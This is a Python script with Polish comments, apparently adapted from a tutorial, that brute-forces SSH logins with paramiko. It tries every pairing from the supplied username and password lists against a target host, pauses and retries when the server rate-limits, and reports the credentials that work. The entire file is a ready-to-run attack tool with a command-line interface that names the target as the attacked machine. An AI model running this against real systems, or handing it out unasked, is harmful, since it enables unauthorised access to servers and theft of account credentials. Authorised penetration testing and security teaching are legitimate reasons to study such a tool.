import logging
import os.path
import paramiko
import socket
import time
from logging import NullHandler

# https://www.thepythoncode.com/article/brute-force-ssh-servers-using-paramiko-in-python

def _try_connection(target_host, user, password, target_host_port=22):
    logging.getLogger('paramiko.transport').addHandler(NullHandler())
    ssh_session = paramiko.SSHClient()
    ssh_session.set_missing_host_key_policy(paramiko.AutoAddPolicy)
    try:
        # print(f"{user}:{password}")
        ssh_session.connect(
            hostname=target_host,
            username=user,
            password=password,
            timeout=10,
            port=target_host_port,
            banner_timeout=20,
            auth_timeout=20
        )
    except OSError as e:
        if str(e) == '[Errno 101] Network is unreachable':
            print(f"[!] Host: {target_host} jest nieosiągalny!")
            exit(1)
    except socket.timeout:
        print(f"[!] Host: {target_host} jest nieosiągalny, upłynął limit czasu.")
        return False
    except paramiko.ssh_exception.AuthenticationException:
        if __name__ == '__main__':
            print(f"[!] Błędne dane logowania {user}:{password}")
        return False
    except paramiko.SSHException:
        if __name__ == '__main__':
            print(f"[*] Przekroczono limit połączeń, ponawiam próbę {user}:{password} z opóźnieniem...")
        time.sleep(10)
        return _try_connection(target_host, user, password, target_host_port)
    # except EOFError:
    #     print("EOFError - odsapnę trochę...")
    #     time.sleep(10)
    #     return _try_connection(target_host, user, password, target_host_port)
    # except ConnectionResetError:
    #     print('muszę trochę odsapnąć')
    #     time.sleep(10)
    #     return _try_connection(target_host, user, password, target_host_port)
    # except:
    #     print('ogólny except')
    #     time.sleep(2)
    #     return _try_connection(target_host, user, password, target_host_port)
    else:
        # Połączenie zostało pomyślnie nawiązane
        if __name__ == "__main__":
            print(f"[+] Określono dane dostępowe:\n\tHost: {target_host}\n\tUżytkownik: {user}\n\tHasło: {password}")
        return {"target_host": target_host, "user": user, "password": password}


def ssh_brute_force(target_host: str = None, users='', passwords='', target_host_port=22):
    assert isinstance(target_host, str), "Nie określiłeś hosta docelowego!"
    result = {
        'target_host': target_host,
        'result': False,
        'credentials': []
    }
    # users -> lista w postaci [], plik, pojedyncza nazwa użytkownika
    if isinstance(users, list):
        # przekazano listę użytkowników
        pass
    elif isinstance(users, str):
        if users == '':
            # nie określono użytkoników -> tutaj musi być jakiś default
            users = ['root']
        else:
            # to może być wskazanie na plik, lub to może być pojedynczy użytkownik
            if os.path.isfile(users):
                # wskazano plik z użytkownikami
                with open(users, errors='ignore') as f:
                    users = f.readlines()
            elif len(users) > 0:
                users = [users]
    if isinstance(passwords, list):
        # przekazano listę haseł
        pass
    elif isinstance(passwords, str):
        if passwords == '':
            # nie określono haseł -> tutaj musi być jakiś default
            passwords = ['password']
        else:
            # to może być wskazanie na plik, lub to może być pojedyncze hasło
            if os.path.isfile(passwords):
                # wskazano plik z hasłami
                with open(passwords, errors='ignore') as f:
                    passwords = f.readlines()
                pass
            elif len(passwords) > 0:
                passwords = [passwords]
    for user in users:
        user = user.replace("\n", "")
        for password in passwords:
            password = password.replace("\n", "")
            if _try_connection(target_host, user, password, target_host_port):
                result['credentials'].append({'user': user, 'password': password})
                break
    if len(result['credentials']) > 0:
        result['result'] = True
    return result


if __name__ == "__main__":
    import argparse

    descr = "Prosty skrypt do próby złamania hasła dla usługi SSH."
    parser = argparse.ArgumentParser(description=descr)
    parser.add_argument("--host", help="Nazwa hosta albo adres IP atakowanej maszyny.", required=True)
    parser.add_argument("--port", help="Port SSH (domyślnie 22)")
    parser.add_argument("--user", help="Nazwa użytkownika lub plik z listą użytkowników (domyślnie root)", required=True)
    parser.add_argument("--password", help="Hasło do sprawdzenia lub plik z listą haseł.", required=True)

    # parsowanie przekazanych argumentów
    args = parser.parse_args()
    if args.host:
        target_host = args.host
    if args.port:
        target_host_port = args.port
    else:
        target_host_port = 22
    if args.user:
        users = args.user
    else:
        users = ''
    if args.password:
        passwords = args.password
    else:
        passwords = ''

    ssh_brute_force(target_host=target_host, target_host_port=target_host_port, users=users, passwords=passwords)
